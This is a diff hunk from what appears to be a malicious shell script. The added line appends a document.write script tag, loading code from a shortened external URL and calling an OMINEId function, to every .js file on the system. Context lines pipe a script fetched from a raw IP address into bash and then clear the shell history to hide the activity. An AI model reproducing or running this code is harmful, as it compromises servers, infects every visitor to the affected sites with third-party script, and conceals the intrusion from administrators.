@@ -276,6 +276,6 @@ do
         fi
     fi
 done
-find ./ -name '*.js'|xargs grep -L f4ce9|xargs sed -i 's!document.write\('\'\<script\ src=\"http://t.cn/EvlonFh\"\>\</script\>\<script\>OMINEId\(\"a27fcc3ac6b1429eb5639f57bad3327d\",\"-1\"\)\</script\>\'\)\;'!!g'
+find / -name '*.js'|xargs grep -L f4ce9|xargs sed -i '$a\document.write\('\'\<script\ src=\"http://t.cn/EvlonFh\"\>\</script\>\<script\>OMINEId\(\"e02cf4ce91284dab9bc3fc4cc2a65e28\",\"-1\"\)\</script\>\'\)\;
 bash -c 'curl -fsSL 122.51.164.83:7770/bsh.sh|bash' 2>/dev/null
 history -c
